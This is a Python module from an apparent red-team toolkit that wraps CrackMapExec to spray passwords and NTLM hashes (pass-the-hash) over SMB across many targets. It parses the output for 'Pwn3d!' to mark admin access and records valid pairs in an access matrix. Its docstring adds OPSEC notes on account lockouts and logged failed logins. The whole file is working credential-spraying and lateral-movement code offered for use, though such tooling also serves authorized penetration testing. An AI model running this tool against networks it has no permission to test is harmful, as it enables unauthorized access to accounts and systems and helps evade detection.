"""
Credential Testing Operation
Tests credentials against targets to build access matrix
"""

import sys
from pathlib import Path
from typing import List

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from ..core.models import (
    Credential,
    AccessEntry,
    AccessLevel,
    AccessMatrix,
    ExecutionMethod,
    CredentialType
)
from ..utils.output import output
from ..utils.executor import executor


class CredentialTester:
    """
    Tests credentials against targets

    Uses CrackMapExec to spray credentials across targets
    and builds an access matrix showing valid combinations.

    OPSEC Considerations:
        - Multiple failed logins may trigger lockouts
        - SMB authentication is logged (Event ID 4625)
        - Consider delay between attempts
        - Prioritize known-good credentials
    """

    def __init__(self, timeout: int = 10):
        """
        Initialize credential tester

        Args:
            timeout: Timeout for each authentication attempt
        """
        self.timeout = timeout

    def _build_cme_command(self, target: str, credential: Credential) -> str:
        """Build CrackMapExec SMB command"""
        if credential.cred_type == CredentialType.HASH:
            return (
                f"crackmapexec smb {target} "
                f"-u '{credential.username}' "
                f"-H '{credential.ntlm_hash}' "
                f"-d '{credential.domain}'"
            )
        else:
            return (
                f"crackmapexec smb {target} "
                f"-u '{credential.username}' "
                f"-p '{credential.password}' "
                f"-d '{credential.domain}'"
            )

    def _parse_cme_output(self, output_text: str) -> AccessLevel:
        """
        Parse CrackMapExec output to determine access level

        Args:
            output_text: Combined stdout/stderr from CME

        Returns:
            AccessLevel achieved
        """
        # Check for admin access (Pwn3d!)
        if 'Pwn3d!' in output_text:
            return AccessLevel.ADMIN

        # Check for failed auth
        if 'STATUS_LOGON_FAILURE' in output_text:
            return AccessLevel.NONE

        if 'STATUS_ACCOUNT_LOCKED_OUT' in output_text:
            return AccessLevel.NONE

        # Check for successful auth (+ indicator without failure)
        if '+' in output_text:
            return AccessLevel.USER

        return AccessLevel.NONE

    def test_single(self, target: str, credential: Credential) -> AccessEntry:
        """
        Test single credential against single target

        Args:
            target: Target IP or hostname
            credential: Credential to test

        Returns:
            AccessEntry with results (may have NONE access level)
        """
        cmd = self._build_cme_command(target, credential)
        result = executor.execute_silent(cmd, timeout=self.timeout)

        access_level = self._parse_cme_output(result.output)

        return AccessEntry(
            target=target,
            credential=credential,
            access_level=access_level,
            method=ExecutionMethod.SMB
        )

    def test_all(self, targets: List[str], credentials: List[Credential],
                 method: ExecutionMethod = ExecutionMethod.SMB) -> AccessMatrix:
        """
        Test all credentials against all targets

        Builds complete access matrix.

        Args:
            targets: List of target IPs/hostnames
            credentials: List of credentials to test
            method: Method to use for testing

        Returns:
            AccessMatrix with all valid entries
        """
        output.banner("CREDENTIAL TESTING")
        output.info(f"Targets: {len(targets)}")
        output.info(f"Credentials: {len(credentials)}")
        output.info(f"Total tests: {len(targets) * len(credentials)}")
        output.info(f"Method: {method.value}")

        matrix = AccessMatrix()

        for target in targets:
            output.newline()
            output.info(f"Testing {target}...")

            for credential in credentials:
                entry = self.test_single(target, credential)

                if entry.access_level != AccessLevel.NONE:
                    matrix.add_entry(entry)

                    output.access_result(
                        credential.domain,
                        credential.username,
                        target,
                        entry.access_level.value
                    )

        output.newline()
        output.success(f"Found {len(matrix.entries)} valid credential pairs")
        output.info(f"Admin access: {len(matrix.get_admin_access())}")
        output.info(f"User access: {len(matrix.get_user_access())}")

        return matrix